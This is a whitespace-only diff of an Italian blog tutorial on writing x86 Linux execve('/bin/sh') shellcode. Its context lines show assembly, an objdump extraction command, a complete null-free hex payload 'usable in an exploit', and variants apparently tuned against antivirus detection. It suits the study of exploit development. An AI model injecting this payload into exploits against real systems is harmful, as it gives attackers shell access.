@@ -64,13 +64,13 @@ un puntatore alle variabili d'ambiente che si intende passare al comando. Nel
 nostro caso possiamo risparmiare codice e dare un NULL come valore.
 
 {% highlight asm %}
-global _start                   
+global _start
 
 section .text
 
 _start:
 ; Executing shell
-; 
+;
 ; int execve(const char *filename, char *const argv[], char *const envp[]);
 ; execve() is defined as #define __NR_execve 11 on /usr/include/i386-linux-gnu/asm/unistd_32.h
 
@@ -95,7 +95,7 @@ objdump -d _nomefile_ |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d'
 {%endhighlight%}
 
 La nostra shellcode di partenza è questa e non ha byte \x00 che ne
-impedirebbero poi l'utilizzo all'atto pratico all'interno di un exploit: 
+impedirebbero poi l'utilizzo all'atto pratico all'interno di un exploit:
 
 {% highlight sh %}
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
@@ -117,13 +117,13 @@ per il comando "/bin/sh", mentre gli altri due saranno immediatamente consumati
 da una POP per inizializzare i registri ECX ed EDX.
 
 {% highlight asm %}
-global _start			
+global _start
 
 section .text
 
 _start:
 ; Executing shell
-; 
+;
 ; int execve(const char *filename, char *const argv[], char *const envp[]);
 ; execve() is defined as #define __NR_execve 11 on /usr/include/i386-linux-gnu/asm/unistd_32.h
 
@@ -133,7 +133,7 @@ _start:
 xor eax, eax
 push eax	; The NULL byte
 push eax	;
-push eax 	; 
+push eax 	;
 pop ecx		; ECX set to 0
 pop edx		; EDX set to 0
 
@@ -170,7 +170,7 @@ il valore del registro ECX e memorizzando il risultato della moltiplicazione in
 EAX ed EDX.
 
 {% highlight asm %}
-; 
+;
 ; int execve(const char *filename, char *const argv[], char *const envp[]);
 ; execve() is defined as #define __NR_execve 11 on /usr/include/i386-linux-gnu/asm/unistd_32.h
 
@@ -237,13 +237,13 @@ Il mio shellcode in assembler diventa quindi:
 
 {%highlight asm%}
 ; https://www.virustotal.com/gui/file/f1436a1ca76847e3425d9127a8829b0109bb8af7bf728352c3edfa886de93677/detection
-global _start			
+global _start
 
 section .text
 
 _start:
 ; Executing shell
-; 
+;
 ; int execve(const char *filename, char *const argv[], char *const envp[]);
 ; execve() is defined as #define __NR_execve 11 on /usr/include/i386-linux-gnu/asm/unistd_32.h
 
